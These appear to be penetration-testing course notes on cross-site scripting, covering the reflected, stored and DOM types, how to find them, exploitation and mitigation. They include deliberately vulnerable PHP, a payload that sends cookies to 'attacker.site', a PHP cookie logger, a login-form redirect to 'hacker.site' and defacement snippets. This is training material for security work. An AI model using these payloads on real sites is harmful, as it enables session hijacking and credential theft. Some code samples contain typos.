# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
___________________________________
# Web App Security
# Module 3 - Cross Site Scripting

https://cdn.members.elearnsecurity.com/ptp_v5/section_5/module_3/html/index.html

###### Module Map
1. Cross Site Scripting
2. Anatomy of an XSS exploitation
3. The Three Types of XSS
4. Finding XSS
5. XSS Exploitation
6. Mitigation

___________________________________
## Introduction
Attacks triggered by user input are called input validation attacks.

  Input validation attack is when malicious input tries to subvert the anticipated function of an application because of either insufficient validation by the application or by the server, before it uses the data.

Most web application web vulnerabilities are the result of poor coding design and ignorance of the best practice of secure coding methodologies.

We will see some common mitigation techniques while studying each vulnerability.

Input validation attacks include XSS, SQL Injections, HTTP Header tampering and many others.

We will have a thorough look at each of them with their technique discovery and exploitation techniques.

___________________________________
## 3.1. Cross Site Scripting
Cross Site Scripting is one of the oldest web application attacks known, and is dated from around 1996-1998 when it was possible to control frames within a web page, through injected code, thus "crossing" the website boundaries.

Currently, it is still on top of the OWASP Top 10. This clearly goes to show how much of a threat this really is!

Cross Site Scripting is an attack in which its ultimate purpose is to inject HTML (known as HTML injection) or run code (JavaScript) in a user's Web browser.

XSS is considered an attack against the user of a vulnerable website.

The best way to introduce XSS is with this basic example.
  Consider the following PHP code:
    ```
    <?php
    echo '<h4>Hello ' . $_GET['name'] . '</h4>'
    ?>
    ```

  The above code prints a welcome message to the user whose name is retrieved from the `$_GET` variable.
    If you are not a PHP programmer, the `$_GET` variable stores the `<parameter,value>` pairs passed through the HTTP GET method.

    GET is the method used when clicking links or directly typing the website URL you want to browse, into your browser's location bar.

  The user input will be extracted from the querystring of the URL browsed (directly or by clicking on a link)
    ```
    http://victim.site/welcom.php?name=MyName
    ```
    When the above is passed to the sever, the `$_GET` variable will contain a `name` parameter with the value `MyName`.

    `?name=MyName` is called querystring

    The following HTML code will be returned from the server to the web browser:
      ```
      <h4>Hello MyName</h4>
      ```

    Our input is part of the output web page source code.

  Now let us see what happens if we submit this payload to the same page in the same parameter `name`:
    ```
    http://victim.site/welcome.php?name=</h4><script>alert('This is an XSS');</script>
    ```
    Note: the above URL should be URL-encoded
      Most browsers will do this for you.
      The URL-encoded version is the following:
        ```
        %3%2fh4%3e%3script%3ealert(%e2%80%98This+is+an+XSS%e2%80%99)%3b%3c%2fscript%3e)
        ```
  The server will run this code:
    ```
    <h4>Hello </h4><script>alert('This is an XSS');</script></h4>
    ```

The above is a fully functional XSS attack, It injects some JavaScript code into the web page source code.

The JavaScript will be executed within the website context of the browser.

This happen because the developer has forgotten to check the user input for malicious patterns.

XSS attacks are possible when the user input is used somewhere on the web application output. This lets an attacker get control over the content rendered to the application users, thus attacking the users themselves.

___________________________________
## 3.2. Anatomy of an XSS exploitation
XSS attacks can be used to achieve many goals, for example:
- Cookie stealing
- Getting complete control over a browser
- Initiating an exploitation phase against browser plugins first and then the machine
- Perform keylogging

#### How XSS exploitation works:
**Hackers Goals**: Run JavaScript to steal a session code of user X who is authenticated (logged in) on website Y

**Steps:**
1. The hacker find an XSS vulnerability affecting the website
  He will have to make sure that the Host (subdomain), in which he is looking for, matches the domain field of the cookie.

  For example:
    If the authenticated area of website *Y* is *auth.y.com*, the domain in the cookie will most likely be set to *auth.y.com*.

    He will have to find an XSS in that same subdomain.

2. Once an XSS exploit is located, he will have to:
   - build a payload
   - create a link
   - send it to the victim inviting the same to click on it (This is called Reflective XSS that we will see much more details in the next paragraphs)

    For example:
    ```
    <img src="http://auth.y.com/vuln.php?<XSS payload>">
    ```
    The image tag above may be inserted in a third-party website that the victim may trust.


We should not forget that the hacker's final goal is to have his victim's browser visit the crafted link (carrying the payload), so he will use any trick at his disposal.

We as pentesters, may want to exploit XSS found in webapps to take control of privileged accounts in order to escalate our privileges.

___________________________________
## 3.3. The Three Types of XSS
Hackers can exploit XSS vulnerabilities in many different ways.
Because of that, in this course we will use the following classification for XSS attacks:
- Reflected XSS
- Stored XSS
- DOM XSS

In the following slides you will see the difference between each attack family, then we will see how to mount and exploit an XSS attack.

**Reflected XSS**
is probably the most common and well understood form of XSS vulnerabilities.
It occurs when untrusted user data is sent to a web application and is immediately echoed back as untrusted content.

Then, as usual, the browser receives the code from the web server response and renders it.

Clearly, this type of vulnerability deals with the **server-side** code. A simple example of vulnerable PHP code is the following welcome message:
  ```
  <?php $name = @$_GET['name']; ?>
  Welcome <?=$name?>
  ```

**Persistent / Stored XSS**
are similar to Reflected XSS, however, rather than the malicious input is being directly reflected in the response, it is stored within the web application.

Once this occurs, it is then echoed somewhere else within the web application and may be available to all visitors.

Although types of XSS flaws occur within the server-side code, but, between the two, this is the most useful one for an attacker.

The reason is simple. With a page persistently affected, we are not bound by having to trick a user. We just exploit the website and then any visitor that visits will run the malicious code and be affected.

**DOM XSS**
is a form of XSS that exists only within client-side code (typically JavaScript).
Generally speaking, this vulnerability lives within the DOM environment, thus within a page's client side script itself and does not reach server-side code.

This is similar to our Reflected XSS example but without interacting with the server-side. A web application can echo the welcome message in a different way as you will be able to see in the following sample code:
  ```
  <h1 id='welcome'></h1>
  <script>
    var w = "Welcome ";
    var name = document.location.hash.substr(
               document.location.hash.search(/#w!/i)+3,
               document.location.hash.length
      );
    document.getElementById('welcome').innerHTML = w + name;
  </script>
  ```

The key to exploiting this type of XSS flaw is that the client-side script code can access the browser's DOM elements, with all the information available in it.
Example of this information include the URL, history, cookies, local storage, and many others.
Despite this, DOM is a jungle, and finding this type of XSS is not the easiest task.

Now that you have the basic classification in mind, we can dig further into each category.
#### 2.3.1. Reflected XSS
In **Reflected XSS** (or Non-persistent XSS), victims bring the payload in their HTTP request to the vulnerable website.
This payload will be inserted into the webpage and executed by their browsers.

This may sound weird but, in fact, it is not; the hacker has to trick the victim into starting a specially crafted request (clicking on a link, foe example) to the vulnerable website page in order for the attack to be successful.
When this occurs, the malicious payload is run in the victim's browser within the context of the vulnerable website.

(See img-37)

The hacker has many techniques at his disposal to camouflage the offending URL:
- [tinyurl](http://tinyurl.com/) and similar services
- iframes located in a third-party malicious page
- link in a targeted email
- and so on.

Most of the time, reflected XSS are used by hackers to steal session IDs (Stored in cookies) or the cookies themselves.
More advanced reflected XSS can be used for phishing techniques, XSS worms, or to install malware on victim's machine through the exploitation of web browser vulnerabilities.

The most naive may ask:
  Why should I do this complicated attack when I can route the user to a webpage that I own and read the cookies for `auth.y.com` from there?

  We say "run code in the website's context" on purpose.
  Only JavaScript (or Vbscript) embedded in `auth.y.com` can read cookies belonging to `auth.y.com`.

Script injected and executed in the context of the vulnerable website will allow us to read the cookie content. It will redirect the cookie content to a web page on our server that will log it for us (that is why it is called Cross Site Scripting; we are able to read content crossing the website's security boundaries).

We will see this more when we talk about Cookie stealing through XSS.



#### 3.3.2. Persistent / Stored XSS
**Persistent XSS** are attacks that lead to the execution of code in all the users web browsers visiting a vulnerable (and exploited) web page.

The injected code is saved by the application, unsanitized, and then rendered on either the same, or another web page in the same website.

The malicious code can be injected, by the attacker, directly into the web application.

This is the most important difference between **Reflected** and **Persistent XSS**.

This is the most dangerous form of XSS, as it can target all the visitors of a website, and it is the only form of XSS actually (although indirectly) targeting the website itself (not just its visitors).

A **persistent XSS** is capable of defacing a web page, altering its original appearance.
  Note: **Reflected XSS** would deface the appearance of the website only for the intended victim carrying the payload.
Such an attack is very destructive and likely to occur in: community, content drive, custom applications, like blogs, commenting systems, and social networks.

Let's see the attacking scenario of XSS.
(see img-46)
In this scenario, `page.php` has a form with 3 parameters: `Param1`, `Param2`, and `Param3`.
All of these user submitted parameters are saved in the database for later use.

One of these parameters is not sanitized for illegal characters and is prone to Persistent XSS.

The hacker constructs his exploit, carrying the XSS payload, which will be stored in the database.
The web application is designed so that `Param2`, submitted by the hacker, is displayed on `page_out.php` (once again unsanitized).

This scenario is very common and applied to a number of situations like:
- Commenting scripts
- Personal community member profiles that accept and input (these must be shown on other pages within the same website)

The outcome of this scenario is depicted in the following image
(see img-50)

By visiting `page_out.php` (the page where `Param2` is the output), all visitors of the vulnerable website execute the malicious payload that was submitted by the hacker.

Note that this type of attack is asynchronous as the exploitation and actual execution of the code happens at different times.

During a reflected XSS attack:
- the user could defend himself at some extent relying upon his experience and security awareness

However, in this case (Persistent XSS):
- the attack is so covert and neat, that as soon as the user browses the infected page, the code is automatically executed.


#### 3.3.3. DOM XSS
**DOM** (Document Object Model) is an object built by the web browser upon parsing the web page content provided by the server.

This makes it easy to navigate through the different HTML tags and the hierarchy of these:
- HTML
  - HEAD
  - BODY
    - H1 (This is a header)
    - P (This is some text)

Functions like **getElementByTagName** are DOM functions that let us navigate through the page elements in a hierarchical view (a node may have children as well as a father and may contain attributes and so on).
An example of what the DOM-tree of a web page looks like using Firebug or DOM inspector add-ons for Firefox.

DOM-based XSS attacks differ from the two types explained above (Reflected and Persistent) because they are not caused by coding mistakes on the server side.

They are instead allowed when the JavaScript code uses the user supplied data as part of its logic.

Once again, if sanitation is not put in place, injection is possible.

Like the other types of XSS, DOM-based XSS attacks can be used to either steal confidential data (session and cookies for example) or, hijack the user account.

JavaScript code can use querystring provided to the webpage as input to perform operations accordingly.

Another way to gather user input to use the prompt() method.

We will concentrate on input from the querystring because it is typically the easiest to exploit (the reason, we will explore soon).
When the user input is part of the querystring and is used as output through either the function `document.write` or, its variants, it is possible to inject arbitrary content into the web page.

It is important to note that this attack does not require any interaction with the server.
  For example, the following code can be inserted into the `<HEAD>` of the local HTML file (*test.html* for example):
    ```
    <script>
      var pos = document.URL.indexOf("name=")+5;
      document.write(document.URL.substring(pos,document.URL.length));
    </script>
    ```
  Requesting this file in the following way:
    ```
    test.html?name=Armando
    ```
  This will print out on the screen the user input: `Armando`.
  This example is adapted from the original Amit Klein [DOM based XSS or XSS of the third kind](http://www.webappsec.org/projects/articles/071105.shtml)

DOM-based XSS can even be persistent. If the malicious payload is saved by the web application within a cookie, the victim user, providing the server with the poisoned cookie, will run the malicious payload every time a new request is sent to *sent.html*

___________________________________
## 3.4. Finding XSS
#### 3.4.1. Black Box
In a black box testing endeavor, finding Reflected XSS is a relatively easy task.
Although, we do not have access to the application source code, we can try to figure out what data the application gives as output upon user supplied data.
If there is a correlation between both output-input and the user supplied data is part of the output, then we have found a potential mount point for an XSS attack.

Once we have spotted these output <=> input correlations, we will try to inject either HTML or JavaScript code into the input. When we say Input, we mean one of the following:
- **GET/POST** variables
- **Cookie** variables
- **HTTP Headers** variables

So you should be capable of understanding what channel(s) the application uses to retrieve data from the user.

The channel used by the web application may change the level of explorability:
  Input from the GET method is the easiest to exploit.
    By including payload in a crafted link, when the victim clicks on this link, they are executing an example of XSS (carried in the **GET** method of the HTTP request)
  The **POST** verb, is used for forms submission, therefore exploiting it requires both some tricks and a different exploitation approach.

Assuming we are exploiting a normal GET method, we will try browsing the web application, attempting to inject HTML into the input parameter of the URL.
  This is not only can be a time-consuming task, but also, we should try this for every parameter that is found to be part of the output of the web application.

  What should we inject to test the application?
    Keep in mind that XSS is the injection of HTML and/or JavaScript therefore, at first, you will want to use a simple payload like `<plaintext>`.

      This special HTML tag instructs the browser to treat the remaining web page source as plain text, thus, breaking the appearance of the site.

    You can immediately tell if the injection was successful without inspecting the source; you will just see a broken web page layout showing the web page source as part of the website appearance. (see img-69-70)

    Injecting `<plaintext>` tag is not indicative of the possibility of injecting scripts.

The developer of the application in scope may have put some type of input validation in place in order to prevent script injection. That is why the second step would be to check to possibility of injecting scripts using the `<script>` tag or using one of the DOM events as we will see soon.

It is also important to note, that input validation routines may allow innocuous **plaintext** tag but, may deny tags like **IFRAME** or **IMG**.

It is clear now that using **plaintext** tag is not enough to infer the presence of an XSS vulnerability.

#### 3.4.2. Whitebox
If you are given the source code of a web application and you need to spot all the potential XSSs, this paragraph is for you.

A general rule for this kind of (iterative and complex) task is to look for all the points where the application outputs data (totally or partially) supplied by the user and tracking it back to the source where it is retrieved for the first time:
  If sanitation or integer conversion is made then you should be fine (as long as the sanitation is properly implemented).

In this process, one should also take in consideration data that comes from the database.
This data may not have been sanitized and as a result, can result in a Persistent XSS mount point.

  This endeavor is time consuming, so the use of cross referencing tools like *PHP XREF* for PHP language projects is highly recommended.
  It will help you with the tracking of variables life from declaration to their death on output.

If you have carefully followed the advice explained in the *Information gathering* module, you should already have a rough completed list of all the inputs taken by every page in the website.

You will use this list to map the user input variables to the output given in the source code of the web application.

  For example, your list of input parameters for *page.php* is:
  - `name=[STRING]`
  - `tel=[NUMERIC]`

  Looking at the code of *page.php* you will find out:
    ```
    <?php
    $name=$_GET['name'];
    $telephone_n=$_GET['tel'];
    ?>
    ```
  So your map will be:
  - `name=>name`
  - `tel=>telephone_n`

    The first (`tel`) being the input parameter name of the querystring and the second (`telephone_n`), the variable being used to store it in the code.
    You will use the latter to do your source code analysis for XSS.

(see vid-81)

___________________________________
## 3.5. XSS Exploitation
Here are some real world examples of XSS exploitations.
We will be using this piece of vulnerable code to run our tests:
  ```
  <html>
  <head><title>Test XSS</title></head>
    <body>
      <img src="logo.png" alt="<?= $_GET['name'] ?>">
    </body>
  </html>
  ```
  The previous piece of code is just another example of a vulnerable page you can write in PHP.
  We will see how to exploit it and build a payload to exploit the XSS vulnerability.

  If you want to practice with i, you can just create a PHP file with the above code. However, if you do not have a web server with PHP installed you can set it up in about 5 minutes using *WAMP* or *LAMP*.

The `name` parameter, passed to the application through the URL, is printed in the output without being sanitized.

If we place the above file in a web server and call it using this URL:
  ```
  http://victim.site/index.php?name=<script>alert('XSS Example')</script>
  ```
The application will render:
  ```
  <html>
  <head><title>Test XSS</title></head>
    <body>
      <img src="logo.png" alt="<script>alert('XSS Example')</script>">
    </body>
  </html>
  ```

By retrieving the web page source code, we will realize we have successfully injected JavaScript code. However, this will not be executed due to the fact that it is being inserted in the `alt` parameter of the IMG tag.
In this case, we have to escape out of the alt tag by using:
  ```
  http://victim.site/index.php?name=><script>alert('XSS Example')</script>
  ```

  Unfortunately, this will break the HTML tag structure and show extra suspicious characters in the web site appearance, with extra `">"`. (see img-88)

  This is the web page source:
    ```
    <html>
    <head><title>Test XSS</title></head>
      <body>
        <img src="logo.png" alt=""><script>alert('XSS Example')</script>">
      </body>
    </html>
    ```

To avoid the presence of suspicious characters in the visible part of the web page, we can use the following payload:
  ```
  "><body onload="alert('XSS Example')
  ```
  Note: we are leaving the double quote open because the remaining characters: `">"` will take care of closing our tag.

  ```
  <html>
  <head><title>Test XSS</title></head>
    <body>
      <img src="logo.png" alt=""><body onload="alert('XSS Example')">
    </body>
  </html>
  ```
  The BODY tag turns out to be very useful for XSS payloads.

We have found a perfect way to inject our code into the web page without triggering the user's suspicion but, why not improve our payload with something **Cooler**?
  What about this?
    ```
    " onload="javascript:alert('XSS Example')
    ```
  So we will issue this request:
    ```
    http://victim.site/index.php?name=" onload="javascript:alert('XSS Example')
    ```
    ```
    <html>
    <head><title>Test XSS</title></head>
      <body>
        <img src="logo.png" alt="" onload="javascript:alert('XSS Example')">
      </body>
    </html>
    ```
  The DOM events are often used in XSS exploitation because they allow us to avoid using suspicious characters like `<`, `>`.

  We do not even need to use any HTML tags (like the SCRIPT or BODY tags) here. Therefore, we are able to bypass basic input validations routines that may rely on this type of (silly) check.

If filters and input validation routines are in place, then we will want to ensure to ensure as few suspicious characters as possible.
  In this case the `javascript:` in the `onload` event of our payload can be omitted to become:
    ```
    http://victim.site/index.php?name=" onload="alert('XSS Example')
    ```

Continuing in our effort of refactoring and making our script injection elegant and hard to detect, we can avoid using single quotes with the help of the JavaScript function `String.fromCharCode`.
  This will output a character by its code and the payload would become:
    ```
    " onload="alert(String.fromCharCode(83,83,83))
    ```

Let's see a video showing the process of finding and exploiting simple XSS.

#### 2.5.1. XSS and Browsers
XSS is the injection of scripts and HTML in web page source code.

The way we do this injection, is sometimes tricky and involves quite a bit of knowledge of the technologies involved.

Basically, it should be understood that a payload working under Firefox may not work for Internet Explorer or Safari and vice versa.

Browsers are software that interpret the HTML received by the web sever according to their internal rules.
Just like how you would do your best to code your website to be cross-browser compatible, the same must be said for XSS exploits.

The above examples using the `onload` event and the BODY tag works fine in Firefox while they are stopped by Internet Explorer and Webkit-based browsers such as Safari and Chrome.
This happens because those browsers have and integrated XSS filter for reflected XSS.

Even if these filter can block simple common XSS vectors, they cannot find every XSS because, it really depend on the injection point.

#### 2.5.2. XSS Attacks
Another point to note is that most of the time an XSS Proof-of-Concept (PoC) is something harmless like opening an alert of prompt window.
Because of that reason, most people in the information security field do not understand **what an attacker can do by exploiting an XSS**

Here is a list of potential objectives a hacker can achieve by successfully exploiting an XSS vulnerability discovered in a web site:
- Cookie stealing
- Defacement
- Phishing / Malware
- XSS Worms

###### 3.5.2.1. Cookie Stealing Through XSS
As you saw in the *Introduction* module, cookies carry parameters from an HTTP server to its clients and vice versa.
Clients send cookie content to the server in their requests according to the domain, path, and expiration set in the cookie.

A browser uses the domain, path, and expiration attributes to choose whether it needs to either submit or not submit a cookie in a request for a server.

The SOP prevents cookie stealing. However, we can violate it by means of an XSS attack.
In the following section, you will see how to carry out a **cookie stealing attack** by exploiting an XSS vulnerability.

Example: (see img-105)
  Bob logs into http://alice.xxx:
    ```
                          POST /login.php
                          Host: alice.xxx

                          usr=bob&pwd=secret

    Bob ------------------------ 1 ---------------------------> Alice.xxx
    ```

  http://alice.xxx returns a Session Cookie to Bob's web browser
    ```
                          200 +OK
                          ...
                          Set-Cookie: sessId=184a914c9065a3;domain=alice.xxx
                          <html>
                          ...

    Bob <----------------------- 2 ---------------------------- Alice.xxx
    ```
    The above Set-Cookie directive is part of the HTTP Response headers that Alice will send to Bob.
    bob's browser will save this information in the cookie jar and since the domain is set to be `alice.xxx`, it will be saved in the cookies store for that particular domain.

  Bob visits http://alice.xxx/shopping
    Since Bob's web browser has a Cookie set for `alice.xxx`, any subsequent request (including http://alice.xxx/shopping) will carry that cookie.
      ```
                          GET /shopping
                          ...
                          Cookie: sessId=184a914c9065a3

      Bob ----------------------- 1 -------------------------> Alice.xxx
      ```

      The `sessionId` value (also called token and/or session id) is representative of the session.

      By sending this value to the server, it will allow the server to retrieve the variables set for that session.

      The sessionID can be seen as the primary key for a set of variables (in form of parameter<->value) stored on the server and belonging to a user.

    Now it should be clear that if we steal this sessionID and install the cookie with this sessionID on our browser, we are able to access Bob's account on `alice.xxx`
      |Session IDs   |Parameter    |Value|
      |--------------|-------------|-----|
      |184a914c9065a3|Authenticated|yes  |
      |              |Username     |Bob  |
      |204a564cae65ba|Authenticated|no   |

      We added the parameter *Authenticated* on purpose: it lets the website understand whether the user is authenticated (logged in) or not.

      When a request comes to `alice.xxx` carrying the *sessionID 184a914c9065a3*, Alice will give access to Bob's account on sitie because the variable *Authenticated* is set to *yes* for both that *sessID* and the username Bob.

    The purpose of the following XSS attack is to steal that cookie.
      Once again:
        Cookies can be read only through JavaScript embedded in `alice.xxx` (and only if `httpOnly` is not set for that cookie).

        The same-origin policy forces us to cross security boundaries of websites through an XSS that we have to find with `alice.xxx`

  The first part of the attack is research of a XSS in `alice.xxx`.
    We have been helped in this, by the fact that we know that the cookie has a domain value of `.alice.xxx` and that we can read it from other subdomains as well.

    When having to steal a cookie through XSS, it is very important to understand the surface area of our research.

    We have to look at both the domain and the path value of the cookie issued by `alice.xxx` in order to understand where we will be searching.

    The wider the surface, the better the chances of finding an XSS.

  The following examples should clarify the cases we could encounter:
    1. Case 1
      - `domain=.alice.xxx`
      - The web browser will send the installed cookie to all the `alice.xxx` subdomains including `foo.alice.xxx` and `www.alice.xxx`
      - This lets us broaden our research for XSS surface to all other subdomains as well (Just think of it like a wildcard: `*.alice.xxx`)
    2. Case 2
      - `domain=.www.alice.xxx`
      - In this case, we can search for XSS in the `www` subdomain and in `foo.www.alice.xxx` or `bar.www.alice.xxx` because the cookie will be valid and sent only to those subdomains (`*.www.alice.xxx`)

  The other parameter to consider is the path.
    When a cookie is issued with the parameter `path=/` it is valid for all the directories of the domains it applies.
      Path can limit the validity of the cookie to a specific subdirectory, shrinking the possibilities of finding an XSS.

    `path=/members/`
      Our research for XSS will be limited to "members" directory and its subdirectories: `/members/foo/` or `/members/foo/bar`. (`/members/*`)

    `path=/members`
      Note that the missing trailing confusion to a web developer. The cookie indeed would be valid for the following directories: `/members-fan`, `/membersarea`, `/memberspanel`, and so on.
      You spot the difference: without the trailing slash the wildcard becomes (`/members*`)

    If the above is still unclear, I advise you to create 2 PHP test scripts setting a cookie into 2 different paths (for example `/path1/` and `/path2/`).

      Trying to read cookies from the same scripts using `alert(document.cookie)`.

      This will help in understanding the functionality.

  However, as anticipated, there is a workaround for the path limitation.
    The web browser enforces the same-origin policy on the hostname-port. The Cookie Path has nothing to do with security.
    We still have access to the DOM.

    So it is possible for an application in `path2` to read cookies in `path2` by using the following trick: put this in a HTML path within `/path2/`:
      ```
      <script>
      function cookiepath(path) {
        for (var i = 0; i < window.frames.length; i++){
          frameURL = window.frames[i].lcation.toString();
          if (frameURL.indexOf(path) > -i){
            alert(window.frames[i].document.cookie)
          }
        }
      }
      </script>
      <iframe onload="cookiepath('/path1/')" style="display:none;" src="/path1/index.php"></iframe>
      ```
      Basically a script in a page under `/path1/` is capable of reading the cookie set for `/path2/` through an iframe.
      This means that if you need an XSS in `/path2/` you may still look for it in other paths provided that you are capable to inject the above code exploit.

    Two Firefox extensions may help a lot in testing how the Cookies mechanism works:
      [Live HTTP Header](https://addons.mozilla.org/en-US/firefox/addon/3829) (this helps understanding when the cookie is being sent) and [Cookie Editor](https://addons.mozilla.org/en-US/firefox/addon/4510) that shows the installed cookies and the `<domain,path,expiration>` parameters

    The above discussion is only valid if the `httpOnly` flag is not set in the cookie.
      The flag `httpOnly` prevents cookies from being read by JavaScript (hence they are only used by the HTTP protocol in the Cookie HTTP Request header).

      Also pay particular attention to "secure" cookies.
      These cookies are sent only if HTTPS (SSL) is used in the request.

  Now that we know the subdomains in which we will be able to read the cookie, let us suppose we have found one on the following page: http://alice.xxx/members/search.php

    Search pages are good places to look for XSS.

  So now we can move to building our exploit.
    The exploitation process goes as follows:
    - Read the cookie using JavaScript
    - Redirect the cookie content to a server that we own (let's suppose `foo.com`)
    - Retrieve the logged cookie from our server and install it on our browser using A&C Cookie editor or any other means (This third step may vary according to the browser used)

  JavaScript stores the cookie content in the `document.cookie` object, so we will use it in our exploit code. The exploit is as simple as:
    ```
    http://alice.xxx/members/search.php?kw=<script>var i=new Image();i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;</script>
    ```
    Let us analyze our payload:
      ```
      http://www.alice.xxx/members/search.php?kw=
      ```
        This part contains the vulnerable URL parameter.
      ```
      <script>
        ...
      </script>
      ```
        The two script tags let our injected JavaScript code work.
      ```
      var i=new Image();i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;
      ```
        Here we create an image object and set its source to an attacker controller PHP script.
        Please note that the browser cannot tell if the `src` attribute of an image object is a real image or not, so it must perform a GET request to the attacker-supplied PHP script.

        The `src` attribute is made by concatenating (`%2b` is the URL-encoded version of the `+` character) the URL of an attacker controller script and its query string with the content of `document.cookie`

    The content of `steal.php` is something like:
      ```
      $fn="log.txt";
      $fh=fopen($fn,'a');  // Open a cookie storage file in append mode
      $cookie=$_GET['q'];  // Takes a value from the query string
      fwrite($fh,$cookie); // Appends the $cookie variable content to the cookie storage file
      fclose($fh);
      ```

    As pentesters, we have found a XSS and crafted an exploit link. We could send this to Bob by email or IM, if Bob is a privileges user on `alice.xxx` and if the *rules of engagement* allow this, then we can also take advantage of URL shrinking service like `tinyurl.com` that hides the payload for us.


###### 3.5.2.2. Defacement
Although you will never deface your client's website, defacement is considered one of the most immediately visible damages that an XSS may cause.

Moreover, it happens to be the best way to explain to your client that XSSs should be patched as soon as possible.

In the previous paragraph we analyzed a type of attack that requires the presence of a Reflected XSS vulnerability.
In the case of script injection used to deface a website the victim of the attack is the website itself. This attack requires the presence of a persistent XSS in order to become a real defacement.

As seen in the Persistent XSS section, we will look for this kind of vulnerability in user supplied data that is stored in the database without sanitation.
When we find persistent XSS, we are able to change the appearance of the web page by manipulating the DOM.

A typical DOM manipulation is useful at modifying the page appearance is the following way:
  ```
  document.body.innerHTML="<h1>Defaced</h1>"
  ```

The DOM object body corresponds to the BODY tag that holds the page content.
By settings its content, we basically replace the current content with our own. In this case is just the word *Defaced*

###### 3.5.2.3. XSS for Advanced Phishin Attacks
All of us know phishing by the many spam emails we receive everyday asking for our *PayPal* login credentials.

This and many others are the ways a phisher wants us to visit a crafted website convincing us of its authenticity.

These phishing attacks revolve around deceiving the user into thinking that one website, is a different one.

XSS phishing on the other hand, modifies the actual website in a sneaky way to increase the chances of success.

Injecting script in a website, as we have already seen, gives us complete control over the DOM of the page allowing us to control almost everything.

If the phisher's objective is to steal login credentials and an XSS is found on the login page of a website, the only change to make would be to the **login Form**.
  The attacker would make sure that the username and password would be redirected to a domain belonging to him.

  Note: SSL certs, DNS checks, blacklists, and other phishing defenses fail miserably in handling XSS phishing because the phishing website is the actual website.

The simplest way in performing XSS phishing on a simple login page is to alter the **ACTION** parameter of the **FORM** tag.
  A form tag usually has this structure:
    ```
    <form name="loginform" method="POST" action="/checklogin.cgi">
    ```
  By injecting the following JavaScript:
    ```
    document.forms[0].action="https"//hacker.site/steal.php
    ```
    the page will remain completely unchanged, no modification to the appearance whatsoever, and the URL in the location bar will remain the genuine URL (beside our payload maybe) of teh website the victim wants to login to. SSL will not help the victim either.


###### 3.5.2.4. BeEF
Once an XSS vulnerability is found, **BeEF** is the fastest way to exploit it and gain control of the remote browser.
Moreover, if the browser is unpatched or old, BeEF and **Metasploit Browser Autopwn** are capable of exploiting it to give you a remote shell on the remote machine.

Let us see a video that will explain the above step by step.

(see vid-150)
___________________________________
## 3.6. Mitigation
Cross Site Scripting exploits are **Data Validation vulnerabilities**.

XSS vulnerabilities can happen only if **untrusted user input** is used on the web application output.

This kind of vulnerability is actually an **output encoding vulnerability**: cross site scripting exploitation happens when the attacker manages to inject code on the output!

Mitigating a XSS is about implementing 2 layers:
- **Input validation** to filter the attack vectors as much as possible
- **Context-aware output encoding** to correctly and safely render users' content on the web application pages.

Validating user's input can greatly reduce the chances of falling victim to an XSS attack. The characters needed to represent the input data should be the only ones accepted.
  Example:
    The quantity field on an online shopping cart should accept **only digits**. The developer could implement a whitelist that will accept only numbers.

Every time input supplied by the user is displayed in the web application output, it should be encoded. The encoding engine must know where in the web application output the untrusted input will be rendered.
  Example:
    An online forum could accept some tags like `<spoiler>The assassin was...</spoiler>` but it really should not accept something like `<script>`!

Rendering URL paths requires a different encoding system than rendering special characters. This is different from encoding in JavaScript code.

Because of this, we usually suggest that clients implement cross site scripting filtering by using a **vetted library or a platform function**.

**Caution:** Writing a custom anti-XSS library will very likely be prone to implementation mistakes.

**Never trust user input!!**
